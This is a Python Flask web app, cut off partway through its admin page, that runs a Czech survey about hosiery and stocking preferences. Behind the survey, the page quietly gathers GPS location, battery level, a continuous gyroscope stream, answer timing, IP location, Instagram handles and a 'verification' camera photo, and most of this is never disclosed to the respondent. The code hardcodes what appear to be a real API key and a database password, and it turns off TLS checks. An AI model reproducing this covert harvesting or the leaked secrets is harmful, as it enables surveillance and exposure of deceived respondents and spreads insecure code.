# -*- coding: utf-8 -*-
"""
NEXUS SURVEY SYSTEM v3.2 - OPRAVENA VERZE
Klicove opravy:
  1. ask_ai() - opraveny headers, lepsi error handling, fallback odpovedi
  2. /api/chat - vracI smysluplne chybove hlasky misto "AI neodpovida"
  3. /active_data - opravena logika pro admin dashboard
  4. Gemini fallback funguje spravne
"""
import os, json, time, base64, logging, sqlite3, urllib.request, urllib.error, ssl
from datetime import datetime, timedelta
import unicodedata

def chirurgicka_ocista(text):
    if not text or not isinstance(text, str): return "Neuvedeno"
    text = ''.join(c for c in unicodedata.normalize('NFD', text)
                  if unicodedata.category(c) != 'Mn')
    text = text.lower().strip()
    prevodni_tabulka = {
        "telove": "telova", "telo": "telova", "pletova": "telova",
        "pletove": "telova", "bezova": "telova", "cerne": "cerna",
        "cerny": "cerna", "bile": "bila", "bily": "bila",
        "zadne": "nenosim", "zadna": "nenosim", "nic": "nenosim"
    }
    text = prevodni_tabulka.get(text, text)
    return text.capitalize()

try:
    from flask import Flask, request, render_template_string, jsonify, session, redirect, g, make_response
except ImportError:
    print("ERROR: pip install flask waitress user-agents")
    exit()

try:
    from waitress import serve
    WAITRESS_AVAILABLE = True
except ImportError:
    WAITRESS_AVAILABLE = False

try:
    from user_agents import parse as ua_parse
    UA_SUPPORT = True
except ImportError:
    UA_SUPPORT = False

try:
    import psycopg2
    import psycopg2.extras
except ImportError:
    print("ERROR: pip install psycopg2-binary")
    exit()

# --- CONFIG ---
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "spy")
UPLOAD_FOLDER = 'fotky_od_uzivatelu'
CONFIG_FILE = 'config.json'
PORT = int(os.environ.get("PORT", 5055))
CLAUDE_API_KEY = os.environ.get("CLAUDE_API_KEY", "").strip()
GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "AIzaSyDpqVeOfY82BLuh_hpDPHjQPkd92FYnlhM").strip()
DATABASE_URL = os.environ.get("DATABASE_URL", "postgresql://nexus_db_85j3_user:zyhZ0BfUb2XG9Z7cT2Mep7qGvAWztCVi@dpg-d795vs3uibrs73c34iv0-a/nexus_db_85j3")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("nexus")
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
app.secret_key = os.environ.get("SECRET_KEY", b'nexus_survey_secret_2025_v2')

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

DEFAULT_CONFIG = {
    "login_enabled": True,
    "survey_title": "NEXUS SURVEY",
    "survey_subtitle": "Pomoz nam lepe ti porozumet",
    "questions": [
        {"id": "q_age", "label": "Kolik ti je let?", "type": "number", "chart": "bar", "opts": []},
        {"id": "q_height", "label": "Jaka je tva vyska (cm)?", "type": "number", "chart": "bar", "opts": []},
        {"id": "q_brand_s", "label": "Znacka tenisek", "type": "multiselect", "chart": "bar", "opts": ["Nike", "Adidas", "Vans", "Converse", "Zara", "Jine"]},
        {"id": "q_brand_h", "label": "Znacka puncochy/silonek", "type": "select", "chart": "doughnut", "opts": ["Tezenis", "Calzedonia", "Bellinda", "Wolford", "Evona"]},
        {"id": "q_col_s", "label": "Oblibena barva", "type": "select", "chart": "doughnut", "opts": ["Telova", "Cerna", "Hneda", "Bila", "Zadne"]},
        {"id": "q_pair_sne", "label": "Noseni do tenisek", "type": "select", "chart": "doughnut", "opts": ["Ano", "Ne", "Od urciteho veku ano", "Styl", "Pohodli"]},
        {"id": "q_pair_hee", "label": "Noseni k podpatkum / ploché obuvi", "type": "select", "chart": "doughnut", "opts": ["Naboso", "Podkolenky", "Samodrzky", "Puncochace", "-"]},
        {"id": "q_occ", "label": "Prilezitost / Obleceni", "type": "select", "chart": "doughnut", "opts": ["Saty", "Dziny", "Kostymek", "Leginy"]},
        {"id": "q_why", "label": "Duvod poskozeni/zatrnuti", "type": "select", "chart": "bar", "opts": ["Nehty", "Zatrh o nabytek", "Odreni", "Jine"]},
        {"id": "q_1768941240339", "label": "Oblibeny typ", "type": "select", "chart": "doughnut", "opts": ["Silonkove ponozky", "Sitovane puncochy", "Puncochace"]},
        {"id": "wear_frequency", "label": "Frekvence noseni", "type": "number", "chart": "bar", "opts": []},
        {"id": "stock_count", "label": "Pocet v zasobe", "type": "number", "chart": "bar", "opts": []}
    ]
}

active_users_cache = {}

# ═══════════════════════════════════════════════════════════════════
#  DATABASE
# ═══════════════════════════════════════════════════════════════════
class DBWrapper:
    def __init__(self, conn):
        self.conn = conn

    def execute(self, query, params=None):
        cur = self.conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        if params:
            cur.execute(query, params)
        else:
            cur.execute(query)
        return cur

    def commit(self):
        self.conn.commit()

    def close(self):
        self.conn.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        conn = psycopg2.connect(DATABASE_URL)
        db = g._database = DBWrapper(conn)
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db(app):
    with app.app_context():
        db = get_db()
        db.execute('''CREATE TABLE IF NOT EXISTS visits (
            id SERIAL PRIMARY KEY,
            username TEXT, password TEXT,
            ip TEXT, local_ip TEXT, city TEXT,
            lat REAL, lon REAL,
            device TEXT, battery TEXT, cam_photo TEXT,
            quiz_data TEXT, timing_data TEXT, motion_data TEXT,
            ai_profile TEXT, start_time TEXT,
            is_partial INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        db.commit()

# ═══════════════════════════════════════════════════════════════════
#  AI - OPRAVENA FUNKCE
# ═══════════════════════════════════════════════════════════════════
def ask_ai(prompt, expect_json=False, max_tokens=1024):
    """
    Vola Claude API nebo Gemini API.
    Vraci text odpovedi nebo None pri selhani.
    """
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    # --- Pokus 1: Claude API ---
    if CLAUDE_API_KEY:
        try:
            log.info("Volam Claude API...")
            payload = json.dumps({
                "model": "claude-haiku-4-5-20251001",
                "max_tokens": max_tokens,
                "messages": [{"role": "user", "content": prompt}]
            }).encode("utf-8")

            req = urllib.request.Request(
                "https://api.anthropic.com/v1/messages",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "x-api-key": CLAUDE_API_KEY,
                    "anthropic-version": "2023-06-01"
                },
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=30, context=ssl_ctx) as r:
                res = json.loads(r.read().decode())
                text = res["content"][0]["text"].strip()
                if expect_json:
                    text = text.replace("```json", "").replace("```", "").strip()
                log.info("Claude API OK")
                return text
        except urllib.error.HTTPError as e:
            body = e.read().decode()
            log.error(f"Claude HTTP {e.code}: {body}")
        except Exception as e:
            log.error(f"Claude chyba: {e}")

    # --- Pokus 2: Gemini API ---
    if GEMINI_API_KEY:
        try:
            log.info("Volam Gemini API...")
            payload = json.dumps({
                "contents": [{"parts": [{"text": prompt}]}],
                "generationConfig": {"maxOutputTokens": max_tokens}
            }).encode("utf-8")

            url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
            req = urllib.request.Request(
                url,
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=30, context=ssl_ctx) as r:
                res = json.loads(r.read().decode())
                text = res["candidates"][0]["content"]["parts"][0]["text"].strip()
                if expect_json:
                    text = text.replace("```json", "").replace("```", "").strip()
                log.info("Gemini API OK")
                return text
        except urllib.error.HTTPError as e:
            body = e.read().decode()
            log.error(f"Gemini HTTP {e.code}: {body}")
        except Exception as e:
            log.error(f"Gemini chyba: {e}")

    log.warning("Oba AI endpointy selhaly!")
    return None

HAS_AI = bool(CLAUDE_API_KEY or GEMINI_API_KEY)

# ═══════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
            for k, v in DEFAULT_CONFIG.items():
                if k not in cfg:
                    cfg[k] = v
            return cfg
    except:
        return DEFAULT_CONFIG

def save_config(data):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def get_ip_location(ip):
    if ip in ['127.0.0.1', '::1']:
        return "Localhost"
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=3) as r:
            d = json.loads(r.read().decode())
            if d['status'] == 'success':
                return f"{d.get('city','?')}, {d.get('countryCode','?')}"
            return "Neznamo"
    except:
        return "Neznamo"

def parse_device(ua_string):
    if not UA_SUPPORT:
        return "Unknown UA"
    try:
        ua = ua_parse(ua_string)
        dev_type = "Mobil" if ua.is_mobile else ("Tablet" if ua.is_tablet else ("PC" if ua.is_pc else "Bot"))
        return f"{dev_type} | {ua.os.family} {ua.os.version_string}"
    except:
        return "Chyba"

# ═══════════════════════════════════════════════════════════════════
#  USER FRONTEND HTML
# ═══════════════════════════════════════════════════════════════════
USER_HTML = """<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>SURVEY_TITLE_PLACEHOLDER</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#06070d;--surface:rgba(16,18,30,0.92);--border:rgba(255,255,255,0.07);
  --accent:#7c5cfc;--accent2:#00e5ff;--accent3:#ff2d78;
  --text:#f0f0f5;--muted:#6b7280;--success:#00ff9d;--r:20px;
}
html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:'Space Grotesk',sans-serif}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 50% at 10% 20%,rgba(124,92,252,0.15) 0%,transparent 60%),radial-gradient(ellipse 60% 40% at 90% 80%,rgba(0,229,255,0.1) 0%,transparent 60%);pointer-events:none;z-index:0}
.scene{position:fixed;inset:0;display:flex;justify-content:center;align-items:center;z-index:1}
.card{position:absolute;width:min(440px,94vw);max-height:92vh;overflow-y:auto;background:var(--surface);border:1px solid var(--border);border-radius:28px;padding:36px 32px;backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);box-shadow:0 0 0 1px rgba(255,255,255,0.04),0 40px 80px rgba(0,0,0,0.6);display:none;flex-direction:column;align-items:center;opacity:0;transform:translateY(20px) scale(0.97);transition:opacity .4s cubic-bezier(.16,1,.3,1),transform .4s cubic-bezier(.16,1,.3,1);scrollbar-width:none}
.card::-webkit-scrollbar{display:none}
.card.active{display:flex;opacity:1;transform:translateY(0) scale(1)}
#progress-bar{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--accent),var(--accent2));width:0%;transition:width .5s cubic-bezier(.16,1,.3,1);z-index:100;box-shadow:0 0 12px var(--accent)}
.step-label{font-size:.72rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:16px;align-self:flex-start}
.step-label.ai{color:var(--accent2)}
h1{font-family:'Syne',sans-serif;font-size:2rem;font-weight:800;text-align:center;line-height:1.2;margin-bottom:8px}
h2{font-family:'Syne',sans-serif;font-size:1.5rem;font-weight:700;text-align:center;line-height:1.3;margin-bottom:20px;color:var(--text)}
.subtitle{color:var(--muted);font-size:.9rem;text-align:center;margin-bottom:28px;line-height:1.5}
.logo-mark{width:64px;height:64px;margin-bottom:20px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:18px;display:flex;align-items:center;justify-content:center;font-size:1.6rem;box-shadow:0 0 30px rgba(124,92,252,0.4)}
.opt{width:100%;padding:14px 18px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;margin-bottom:8px;cursor:pointer;font-weight:500;font-size:.97rem;color:var(--text);display:flex;align-items:center;gap:12px;transition:all .18s ease;-webkit-tap-highlight-color:transparent}
.opt:hover,.opt:active{background:rgba(124,92,252,0.12);border-color:var(--accent);transform:translateX(4px)}
.opt.sel{background:rgba(124,92,252,0.2);border-color:var(--accent);box-shadow:0 0 0 1px var(--accent) inset}
.opt-icon{width:32px;height:32px;border-radius:8px;background:rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex-shrink:0}
.hint{font-size:.78rem;color:var(--muted);text-align:center;margin:-4px 0 16px;width:100%}
.input-wrap{width:100%;position:relative;margin-bottom:12px}
.input-wrap input{width:100%;padding:14px 16px;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:14px;color:var(--text);font-family:'Space Grotesk',sans-serif;font-size:1rem;outline:none;transition:border-color .2s}
.input-wrap input:focus{border-color:var(--accent);background:rgba(124,92,252,0.06)}
.input-wrap input::placeholder{color:var(--muted)}
.input-label{font-size:.78rem;font-weight:600;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;display:block}
.slider-val{font-family:'Syne',sans-serif;font-size:3rem;font-weight:800;color:var(--accent2);text-align:center;margin-bottom:8px;line-height:1}
input[type=range]{-webkit-appearance:none;width:100%;background:transparent;margin:16px 0}
input[type=range]::-webkit-slider-runnable-track{height:6px;background:rgba(255,255,255,0.08);border-radius:3px}
input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:26px;height:26px;border-radius:50%;background:var(--accent2);margin-top:-10px;border:3px solid var(--bg);box-shadow:0 0 12px var(--accent2)}
.btn{width:100%;padding:15px;margin-top:12px;background:linear-gradient(135deg,var(--accent),#9b6dff);color:#fff;border:none;border-radius:14px;font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:700;cursor:pointer;letter-spacing:.5px;box-shadow:0 8px 32px rgba(124,92,252,0.35);transition:all .2s}
.btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(124,92,252,0.45)}
.btn:active{transform:translateY(0)}
.btn.secondary{background:rgba(255,255,255,0.05);border:1px solid var(--border);box-shadow:none;color:var(--muted)}
.btn.secondary:hover{background:rgba(255,255,255,0.08);color:var(--text);box-shadow:none}
.ai-orb{width:80px;height:80px;border-radius:50%;background:conic-gradient(from 0deg,var(--accent),var(--accent2),var(--accent3),var(--accent));animation:spin 2s linear infinite;box-shadow:0 0 40px rgba(124,92,252,0.5)}
@keyframes spin{to{transform:rotate(360deg)}}
.orb-wrap{position:relative;width:80px;height:80px}
.ai-orb-inner{position:absolute;width:70px;height:70px;border-radius:50%;background:var(--bg);top:50%;left:50%;transform:translate(-50%,-50%)}
.typewriter{color:var(--accent2);font-weight:600;font-size:1rem;text-align:center;min-height:1.4em}
.done-icon{font-size:3rem;margin-bottom:16px}
.done-title{font-family:'Syne',sans-serif;font-size:2rem;font-weight:800;color:var(--success);margin-bottom:8px;text-align:center}
#vid{width:100%;border-radius:16px;margin-bottom:12px;display:none;object-fit:cover}
.q-wrap{width:100%;display:flex;flex-direction:column;align-items:center;transition:all .3s cubic-bezier(.16,1,.3,1)}
</style>
</head>
<body>
<div id="progress-bar"></div>
<div class="scene">
  <div id="v-intro" class="card active">
    <div class="logo-mark">&#10022;</div>
    <h1>SURVEY_TITLE_PLACEHOLDER</h1>
    <p class="subtitle">SURVEY_SUBTITLE_PLACEHOLDER</p>
    <button class="btn" onclick="init()">Zacit pruzkum &rarr;</button>
  </div>
  <div id="v-ident" class="card">
    <div class="step-label">Krok 1 / Identita</div>
    <h2>Jak te oslovit?</h2>
    <div class="input-wrap">
      <label class="input-label">Jmeno</label>
      <input id="u" type="text" placeholder="Tvoje jmeno...">
    </div>
    <div class="input-wrap">
      <label class="input-label">Instagram <span style="color:var(--muted);font-weight:400">(volitelne)</span></label>
      <input id="ig" type="text" placeholder="@username">
    </div>
    <button class="btn" onclick="logUser()">Pokracovat &rarr;</button>
  </div>
  <div id="v-quiz" class="card">
    <div class="q-wrap" id="q-wrap"></div>
  </div>
  <div id="v-ai" class="card">
    <div style="display:flex;flex-direction:column;align-items:center;gap:12px;padding:20px 0">
      <div class="orb-wrap">
        <div class="ai-orb"></div>
        <div class="ai-orb-inner"></div>
      </div>
      <div class="typewriter" id="tw"></div>
      <p style="font-size:.85rem;color:var(--muted);text-align:center;line-height:1.6">Nase AI analyzuje tvoje odpovedi<br>a pripravuje personalizovanou otazku...</p>
    </div>
  </div>
  <div id="v-cam" class="card">
    <div class="step-label">Overeni</div>
    <h2>Zaverecne overeni</h2>
    <p class="subtitle">Volitelne &ndash; pomaha nam overit ucast</p>
    <video id="vid" autoplay playsinline muted></video>
    <button id="b-cam" class="btn" onclick="startCam()">&#128247; Zapnout kameru</button>
    <button id="b-snap" class="btn" style="display:none;background:linear-gradient(135deg,#00ff9d,#00b8d4)" onclick="snap()">&#10003; Odeslat &amp; dokoncit</button>
    <button class="btn secondary" onclick="skipCam()">Preskocit &rarr;</button>
  </div>
  <div id="v-done" class="card">
    <div class="done-icon">&#10003;</div>
    <div class="done-title">Hotovo!</div>
    <p class="subtitle">Tvoje odpovedi byly uspesne odeslany. Dekujeme za ucast!</p>
  </div>
</div>
<canvas id="can" style="display:none"></canvas>
<script>
const QS = JSON.parse(atob("QS_B64_PLACEHOLDER"));
let step=0,tm={},ud={quiz:{}},lt=Date.now(),multi=[],clickLock=false,aiFetched=false,gyro='0,0,0';
const EMOJIS={"Saty":"👗","Dziny":"👖","Kostymek":"👠","Pohodli":"☁️","Styl":"✨","Nike":"✔","Adidas":"👟","Vans":"🛹","Converse":"⭐","Zara":"🛍","Tezenis":"👙","Bellinda":"🎀","Calzedonia":"💃","Wolford":"👑","Evona":"🧵","Nenosim":"🚫","Puncochace":"🧦","Samodrzky":"🔥","Telova":"🟤","Cerna":"⚫","Hneda":"🟤","Nehty":"💅","Jine":"🤷"};
if(typeof DeviceOrientationEvent!=='undefined'){const addG=()=>window.addEventListener('deviceorientation',e=>{gyro=Math.round(e.alpha||0)+','+Math.round(e.beta||0)+','+Math.round(e.gamma||0)});if(typeof DeviceOrientationEvent.requestPermission==='function'){document.addEventListener('click',()=>{DeviceOrientationEvent.requestPermission().then(r=>{if(r==='granted')addG()}).catch(()=>{})},{once:true})}else{addG()}}
setInterval(()=>{let s=step<QS.length?(QS[step]?QS[step].id:'Identita'):(step===QS.length?'AI':'Hotovo');fetch('/beat?step='+encodeURIComponent(s)+'&gyro='+gyro)},1500);
function show(id){document.querySelectorAll('.card').forEach(c=>{c.classList.remove('active');c.style.display='none'});const el=document.getElementById(id);el.style.display='flex';requestAnimationFrame(()=>requestAnimationFrame(()=>el.classList.add('active')));lt=Date.now()}
function setProgress(p){document.getElementById('progress-bar').style.width=p+'%'}
function init(){if(clickLock)return;clickLock=true;setTimeout(()=>clickLock=false,500);if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{ud.lat=p.coords.latitude;ud.lon=p.coords.longitude});if(navigator.getBattery)navigator.getBattery().then(b=>ud.battery=Math.round(b.level*100)+'%');show('v-ident')}
function logUser(){if(clickLock)return;clickLock=true;setTimeout(()=>clickLock=false,500);const name=document.getElementById('u').value.trim()||'Anonym';const ig=document.getElementById('ig').value.trim();ud.u=ig?name+' | IG: '+ig:name;showQ()}
function typeEffect(text,cb){const el=document.getElementById('tw');el.textContent='';let i=0;(function type(){if(i<text.length){el.textContent+=text[i++];setTimeout(type,60)}else{setTimeout(cb,400)}})()}
function triggerAI(){aiFetched=true;show('v-ai');const fetchP=fetch('/get_adaptive_question',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({quiz:ud.quiz})}).then(r=>r.json()).catch(()=>({id:"ZACHRANA",label:"Jak bys popsala svuj styl jednim slovem?",opts:["Minimalisticky","Vyrazny","Sportovni"]}));typeEffect("AI ANALYZA OSOBNOSTI",()=>{fetchP.then(d=>{d.type="select";d.id=d.label;QS.push(d);showQ()})})}
function getCleanText(el){const c=el.cloneNode(true);const i=c.querySelector('.opt-icon');if(i)i.remove();return c.innerText.trim()}
function showQ(){const total=QS.length;if(step===total&&!aiFetched){triggerAI();return}if(step>=total){setProgress(100);return show('v-cam')}setProgress((step/total)*100);const q=QS[step];multi=[];const isAI=q.id.includes('AI')||q.id.includes('ZACHRANA');const stepLbl=isAI?'Bonus od AI':`Otazka ${step+1} / ${aiFetched?total-1:total}`;let html=`<div class="step-label ${isAI?'ai':''}">${stepLbl}</div><h2>${q.label}</h2>`;if(q.type==='slider'){html+=`<div class="slider-val" id="slv">5</div><div style="font-size:.85rem;color:var(--muted);text-align:center;margin-bottom:20px">dni v tydnu</div><input type="range" min="0" max="7" value="5" id="sl-in" oninput="document.getElementById('slv').textContent=this.value"><button class="btn" onclick="nextSlider('${q.id}')">Potvrdit &rarr;</button>`}else if(q.type.includes('select')){if(q.type==='multiselect')html+=`<div class="hint">Muzes vybrat vice moznosti</div>`;q.opts.forEach(o=>{const clean=o.normalize('NFD').replace(/[\u0300-\u036f]/g,'');const icon=EMOJIS[clean]||'•';html+=`<div class="opt" onclick="${q.type==='multiselect'?'tog(this)':'sel(this)'}"><div class="opt-icon">${icon}</div>${o}</div>`});if(q.type==='multiselect')html+=`<button class="btn" onclick="nextMulti('${q.id}')">Potvrdit &rarr;</button>`}else{html+=`<div class="input-wrap"><input id="inp" type="${q.type==='number'?'number':'text'}" placeholder="Tvoje odpoved..."></div><button class="btn" onclick="nextInp('${q.id}')">Dalsi &rarr;</button>`}
const wrap=document.getElementById('q-wrap');const doUpdate=()=>{wrap.innerHTML=html;wrap.style.opacity='1';wrap.style.transform='translateX(0)'};if(!document.getElementById('v-quiz').classList.contains('active')){doUpdate();show('v-quiz')}else{wrap.style.opacity='0';wrap.style.transform='translateX(-30px)';setTimeout(()=>{doUpdate();wrap.style.opacity='0';wrap.style.transform='translateX(30px)';requestAnimationFrame(()=>requestAnimationFrame(()=>{wrap.style.opacity='1';wrap.style.transform='translateX(0)'}))},220)}}
function sel(e){if(clickLock)return;clickLock=true;setTimeout(()=>clickLock=false,500);if(navigator.vibrate)navigator.vibrate(40);ud.quiz[QS[step].id]=getCleanText(e);tm['qstep_'+step]=(Date.now()-lt)/1000;step++;showQ()}
function tog(e){if(navigator.vibrate)navigator.vibrate(20);e.classList.toggle('sel');const v=getCleanText(e);if(multi.includes(v))multi=multi.filter(x=>x!==v);else multi.push(v)}
function nextMulti(id){if(clickLock)return;clickLock=true;setTimeout(()=>clickLock=false,500);if(multi.length){ud.quiz[id]=multi;tm['qstep_'+step]=(Date.now()-lt)/1000;step++;showQ()}}
function nextSlider(id){if(clickLock)return;clickLock=true;setTimeout(()=>clickLock=false,500);const v=document.getElementById('sl-in').value;ud.quiz[id]=v;tm['qstep_'+step]=(Date.now()-lt)/1000;step++;showQ()}
function nextInp(id){if(clickLock)return;clickLock=true;setTimeout(()=>clickLock=false,500);const v=document.getElementById('inp').value;if(v){ud.quiz[id]=v;tm['qstep_'+step]=(Date.now()-lt)/1000;step++;showQ()}}
function startCam(){document.getElementById('b-cam').style.display='none';navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(s=>{const v=document.getElementById('vid');v.srcObject=s;v.style.display='block';document.getElementById('b-snap').style.display='block'}).catch(()=>skipCam())}
function snap(){const v=document.getElementById('vid'),c=document.getElementById('can');if(v.srcObject){c.width=400;c.height=300;c.getContext('2d').drawImage(v,0,0,400,300);ud.photo=c.toDataURL('image/jpeg',0.6)}sendData()}
function skipCam(){ud.photo=null;sendData()}
function sendData(){ud.timing=tm;ud.motion=gyro;fetch('/save_all',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(ud)}).then(r=>{show('v-done')}).catch(()=>{show('v-done')})}
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════════════
#  ADMIN HTML
# ═══════════════════════════════════════════════════════════════════
ADMIN_HTML = """<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NEXUS Admin</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=DM+Mono:wght@400;500&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<link href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" rel="stylesheet"/>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#080a12;--nav:#0c0e18;--surface:#0f1120;--surface2:#141627;--border:rgba(255,255,255,0.06);--border2:rgba(255,255,255,0.1);--text:#e8eaf0;--muted:#5a5f7a;--accent:#7c5cfc;--accent2:#00e5ff;--accent3:#ff2d78;--accent4:#ffb547;--accent5:#00ff9d;--r:14px}
html{overflow-x:hidden}
body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;font-size:.9rem;min-height:100vh}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 100% 60% at 10% -10%,rgba(124,92,252,.08) 0%,transparent 60%);pointer-events:none;z-index:0}
.nav{position:sticky;top:0;z-index:100;background:rgba(12,14,24,.92);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);height:56px;display:flex;align-items:center;padding:0 24px;gap:16px}
.nav-brand{font-family:'Syne',sans-serif;font-size:1.1rem;font-weight:800;letter-spacing:1px;color:#fff;white-space:nowrap}
.nav-brand span{color:var(--accent)}
.nav-divider{width:1px;height:24px;background:var(--border2);flex-shrink:0}
.online-pill{display:flex;align-items:center;gap:6px;background:rgba(0,255,157,.08);border:1px solid rgba(0,255,157,.2);border-radius:20px;padding:4px 12px;font-size:.78rem;font-weight:600;color:var(--accent5);font-family:'DM Mono',monospace;white-space:nowrap}
.online-dot{width:6px;height:6px;border-radius:50%;background:var(--accent5);box-shadow:0 0 6px var(--accent5);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.6;transform:scale(.8)}}
.nav-right{margin-left:auto;display:flex;align-items:center;gap:8px}
.nav-btn{padding:7px 14px;border-radius:8px;border:1px solid var(--border2);background:rgba(255,255,255,.04);color:var(--text);font-family:'DM Sans',sans-serif;font-size:.82rem;font-weight:500;cursor:pointer;transition:all .18s;white-space:nowrap;text-decoration:none;display:inline-flex;align-items:center;gap:6px}
.nav-btn:hover{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.2);color:#fff}
.nav-btn.primary{background:rgba(124,92,252,.2);border-color:var(--accent);color:#fff}
.nav-btn.primary:hover{background:rgba(124,92,252,.35)}
.nav-btn.danger{color:var(--accent3);border-color:rgba(255,45,120,.3);background:rgba(255,45,120,.06);display:none}
.nav-btn.danger:hover{background:rgba(255,45,120,.15)}
.main{padding:24px;max-width:1600px;margin:0 auto;position:relative;z-index:1}
.kpi-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
@media(max-width:900px){.kpi-grid{grid-template-columns:repeat(2,1fr)}}
.kpi{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:18px 20px;position:relative;overflow:hidden;transition:border-color .2s}
.kpi:hover{border-color:var(--border2)}
.kpi::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;border-radius:var(--r) var(--r) 0 0}
.kpi.c1::before{background:var(--accent2)}.kpi.c2::before{background:var(--accent)}.kpi.c3::before{background:var(--accent3)}.kpi.c4::before{background:var(--accent5)}
.kpi-label{font-size:.72rem;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-bottom:10px}
.kpi-val{font-family:'DM Mono',monospace;font-size:2rem;font-weight:500;color:#fff;line-height:1}
.kpi-sub{font-size:.78rem;color:var(--muted);margin-top:6px}
.section-title{font-family:'Syne',sans-serif;font-size:.8rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:14px;display:flex;align-items:center;gap:8px}
.section-title::after{content:'';flex:1;height:1px;background:var(--border)}
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);overflow:hidden}
.card-head{padding:14px 18px;border-bottom:1px solid var(--border);font-size:.78rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--muted);display:flex;align-items:center;gap:8px}
.card-body{padding:16px}
#map-box{height:320px;width:100%}
.leaflet-container{background:#080a12!important}
.charts-3col{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:24px}
@media(max-width:900px){.charts-3col{grid-template-columns:1fr}}
.chart-wrap{position:relative;height:160px}
.q-charts-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
@media(max-width:1200px){.q-charts-grid{grid-template-columns:repeat(2,1fr)}}
@media(max-width:600px){.q-charts-grid{grid-template-columns:1fr}}
.tbl-wrap{overflow-x:auto}
table{width:100%;border-collapse:collapse}
thead th{padding:12px 16px;font-size:.72rem;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);border-bottom:1px solid var(--border);text-align:left;white-space:nowrap}
tbody tr{border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s}
tbody tr:hover{background:rgba(255,255,255,.02)}
tbody td{padding:13px 16px;vertical-align:middle}
.td-time{font-family:'DM Mono',monospace;font-size:.85rem;color:var(--accent4);font-weight:500}
.td-name{font-weight:600;color:#fff}
.td-loc{color:var(--muted);font-size:.83rem}
